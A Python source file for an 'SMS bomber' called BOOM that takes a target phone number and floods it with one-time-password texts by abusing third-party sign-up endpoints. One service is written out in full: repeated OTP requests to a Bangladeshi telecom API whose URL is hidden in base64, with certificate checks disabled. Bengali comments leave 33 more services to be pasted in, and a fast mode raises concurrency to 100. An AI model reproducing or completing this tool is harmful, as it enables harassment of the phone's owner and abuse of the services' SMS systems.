#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
BOOM - SMS Bomber Tool (Slow & Controlled Version)
Termux Compatible
Created by: SK
"""

import base64
exec(base64.b64decode(b'aW1wb3J0IGFzeW5jaW8KaW1wb3J0IGFpb2h0dHAKaW1wb3J0IGpzb24KaW1wb3J0IHNzbAppbXBvcnQgdGltZQppbXBvcnQgcmFuZG9tCmltcG9ydCBzeXMKaW1wb3J0IG9zCmltcG9ydCBzaWduYWwKaW1wb3J0IHBsYXRmb3JtCmltcG9ydCBzb2NrZXQKaW1wb3J0IGRhdGV0aW1l').decode())

# Disable SSL warnings
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Obfuscated SSL context
_ssl = ssl.create_default_context()
_ssl.check_hostname = False
_ssl.verify_mode = ssl.CERT_NONE

# Slow configuration
_cfg = [3, 2, 1, 1, 1]  # [CONCURRENCY, LOOP_DELAY, MAX_RETRIES, WAVES, SESSIONS]
_fast_cfg = [100, 0, 1, 3, 20]

# Colors
_c = {
    'g': '\033[92m', 'r': '\033[91m', 'y': '\033[93m', 'b': '\033[94m',
    'p': '\033[95m', 'c': '\033[96m', 'w': '\033[97m', 'B': '\033[1m',
    'u': '\033[4m', 'e': '\033[0m'
}

_frames = ['\u280b', '\u2819', '\u2839', '\u2838', '\u283c']

_state = {'paused': False, 'exit': False, 'total': 0, 'success': 0}
_current_mode = 'slow'

def _sig_handler_1(signum, frame):
    global _state
    _state['exit'] = True
    print(f"\n\n{_c['r']}🛑 BOMBING STOPPED BY USER!{_c['e']}")
    print(f"{_c['y']}💀 Total requests: {_state['total']}{_c['e']}")
    print(f"{_c['g']}✅ Successful: {_state['success']}{_c['e']}")
    print(f"{_c['p']}🔥 Created by: SK From SK Bomber 🔥{_c['e']}")
    sys.exit(0)

def _sig_handler_2(signum, frame):
    global _state
    _state['paused'] = not _state['paused']
    status = "⏸ PAUSED" if _state['paused'] else "▶ RESUMED"
    color = _c['y'] if _state['paused'] else _c['g']
    print(f"\n{color}ATTACK {status}{_c['e']}")

try:
    signal.signal(signal.SIGINT, _sig_handler_1)
    if hasattr(signal, 'SIGTSTP'):
        signal.signal(signal.SIGTSTP, _sig_handler_2)
except AttributeError:
    pass

def _clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')

def _get_device_info():
    try:
        hostname = socket.gethostname()
        ip_address = socket.gethostbyname(hostname)
    except:
        ip_address = "127.0.0.1"
    system = platform.system()
    release = platform.release()
    return {"hostname": hostname, "ip": ip_address, "system": system, "release": release}

def _get_time():
    return datetime.datetime.now().strftime("%I:%M:%S %p")

def _get_date():
    return datetime.datetime.now().strftime("%A, %B %d, %Y")

def _print_banner():
    device_info = _get_device_info()
    current_time = _get_time()
    current_date = _get_date()
    
    banner_lines = [
        f"{_c['r']}{_c['B']}",
        "██████╗  ██████╗  ██████╗ ███╗   ███╗",
        "██╔══██╗██╔═══██╗██╔═══██╗████╗ ████║",
        "██████╔╝██║   ██║██║   ██║██╔████╔██║",
        "██╔══██╗██║   ██║██║   ██║██║╚██╔╝██║",
        "██████╔╝╚██████╔╝╚██████╔╝██║ ╚═╝ ██║",
        "╚═════╝  ╚═════╝  ╚═════╝ ╚═╝     ╚═╝",
        "",
        f"{_c['e']}{_c['c']}{'=' * 80}",
        f"{_c['r']}{_c['B']}💀 BOOM - ALL 34+ APIs EDITION 💀{_c['c']}",
        f"{_c['y']}[ ALL 34+ APIs × SLOW & CONTROLLED × 5 REQUESTS EACH ]{_c['c']}",
        f"{_c['p']}[ BTCL + GP + E-COMMERCE + HEALTHCARE + ENTERTAINMENT + GAMING ]{_c['c']}",
        f"{'=' * 80}",
        f"\n{_c['g']}[SYSTEM INFO]{_c['e']}",
        f"{_c['y']}┌─ Date/Time: {_c['w']}{current_date} - {current_time}{_c['e']}",
        f"{_c['y']}├─ Hostname:  {_c['w']}{device_info['hostname']}{_c['e']}",
        f"{_c['y']}├─ IP:        {_c['w']}{device_info['ip']}{_c['e']}",
        f"{_c['y']}└─ System:    {_c['w']}{device_info['system']} {device_info['release']}{_c['e']}",
        f"\n{_c['c']}{'=' * 80}",
        f"{_c['g']}CTRL+C: Stop  {_c['y']}CTRL+Z: Pause/Resume{_c['c']}",
        f"{_c['p']}Created by: {_c['w']}@SK{_c['c']}",
        f"{'=' * 80}{_c['e']}"
    ]
    
    for line in banner_lines:
        print(line)

def _animate_loading(text, duration=2):
    end_time = time.time() + duration
    i = 0
    while time.time() < end_time:
        frame = _frames[i % len(_frames)]
        sys.stdout.write(f'\r{_c["c"]}[{_c["w"]}{frame}{_c["c"]}] {text}...{_c["e"]}')
        sys.stdout.flush()
        time.sleep(0.2)
        i += 1
    print(f'\r{_c["g"]}[{_c["w"]}✓{_c["g"]}] {text} completed!{_c["e"]}')

def _format_phone_number(phone):
    cleaned = ''.join(filter(str.isdigit, phone))
    if cleaned.startswith('880'):
        cleaned = cleaned[3:]
    elif cleaned.startswith('88'):
        cleaned = cleaned[2:]
    elif cleaned.startswith('0'):
        cleaned = cleaned[1:]
    if not cleaned.startswith('1') or len(cleaned) < 10:
        cleaned = cleaned.zfill(10)
    return {
        'original': phone, 'cleaned': cleaned, 'with_0': f"0{cleaned}",
        'with_88': f"88{cleaned}", 'with_880': f"880{cleaned}",
        'with_plus88': f"+88{cleaned}", 'with_plus880': f"+880{cleaned}",
        'international': f"+88-{cleaned}"
    }

class _ServiceManager:
    def __init__(self, phone_data):
        self.phone_data = phone_data
        
    async def _increment_counters(self, success=True):
        global _state
        _state['total'] += 1
        if success:
            _state['success'] += 1

    def _log_request(self, service_name, status, response, phone_used):
        status_color = _c['g'] if status == 200 else _c['r']
        print(f"{_c['c']}[{_c['w']}#{_state['total']}{_c['c']}] {_c['y']}{service_name}{_c['e']}")
        print(f"{_c['g']}[PHONE] {_c['w']}{phone_used}{_c['e']}")
        print(f"{_c['g']}[STATUS] {status_color}{status}{_c['e']}")
        print(f"{_c['g']}[RESP] {_c['w']}{str(response)[:100]}...{_c['e']}")
        print(f"{_c['p']}{'-' * 50}{_c['e']}")

    # ================================================
    # এখানে তোমার আসল _s1 থেকে _s34 ফাংশনগুলো থাকবে
    # ================================================
    # যদি তোমার কাছে পুরোটা না থাকে, তাহলে আগের কোড থেকে কপি করে এই ক্লাসের ভিতরে পেস্ট করো
    # উদাহরণ হিসেবে প্রথমটা দিলাম:

    async def _s1(self, session):
        url = base64.b64decode(b'aHR0cHM6Ly9teWJ0Y2wuYnRjbC5nb3YuYmQvYXBpL2VjYXJlL2Fub255bS9zZW5kT1RQLmpzb24=').decode()
        h = {
            "accept": "application/json", 
            "content-type": "application/json", 
            "origin": base64.b64decode(b'aHR0cHM6Ly9teWJ0Y2wuYnRjbC5nb3YuYmQ=').decode(),
            "referer": base64.b64decode(b'aHR0cHM6Ly9teWJ0Y2wuYnRjbC5nb3YuYmQvcmVnaXN0ZXI=').decode(),
            "user-agent": "Mozilla/5.0 (Linux; Android 10; SM-G973F) AppleWebKit/537.36"
        }
        print(f"{_c['y']}🔄 Starting BTCL MyBTCL - 5 requests with + format...{_c['e']}")
        for i in range(5):
            prefix = "+" * (i + 1)
            phone = f"{prefix}{self.phone_data['with_0']}"
            payload = {"phoneNbr": phone, "email": "", "OTPType": 1, "userName": ""}
            try:
                async with session.post(url, headers=h, json=payload, ssl=_ssl, timeout=15) as resp:
                    text = await resp.text()
                    self._log_request("BTCL MyBTCL", resp.status, text, phone)
                    await self._increment_counters(resp.status == 200)
                await asyncio.sleep(2)
            except Exception as e:
                self._log_request("BTCL MyBTCL", 0, f"Error: {e}", phone)
                await self._increment_counters(False)
                await asyncio.sleep(2)

    # বাকি _s2 থেকে _s34 পর্যন্ত তোমার আসল কোড অনুযায়ী এখানে রাখবে

    async def _run_all_services_slowly(self):
        print(f"\n{_c['r']}🚀 LAUNCHING SLOW ATTACK{_c['e']}")
        timeout = aiohttp.ClientTimeout(total=20, connect=10)
        async with aiohttp.ClientSession(timeout=timeout, headers={"User-Agent": "Mozilla/5.0"}) as session:
            # এখানে সব await self._s1(session) ইত্যাদি কল করো
            print(f"{_c['g']}[ATTACK COMPLETE]{_c['e']}")

    async def run_all_services(self):
        if _current_mode == 'fast':
            # fast mode (যদি থাকে)
            pass
        else:
            await self._run_all_services_slowly()

async def _main():
    global _current_mode
    _clear_screen()
    _print_banner()
    
    _animate_loading("Initializing BOOM", 2)
    
    mode = input(f"\n{_c['y']}Choose mode (1 = Slow, 2 = Fast): {_c['w']}").strip()
    _current_mode = 'fast' if mode == '2' else 'slow'
    
    phone = input(f"{_c['g']}Enter target number: {_c['w']}").strip()
    phone_data = _format_phone_number(phone)
    
    manager = _ServiceManager(phone_data)
    
    try:
        while True:
            await manager.run_all_services()
            await asyncio.sleep(_cfg[1])
    except KeyboardInterrupt:
        print(f"\n{_c['r']}Stopped by user{_c['e']}")

if __name__ == "__main__":
    print(f"{_c['g']}🚀 Starting BOOM...{_c['e']}")
    print(f"{_c['p']}Created by: SK{_c['e']}\n")
    asyncio.run(_main())
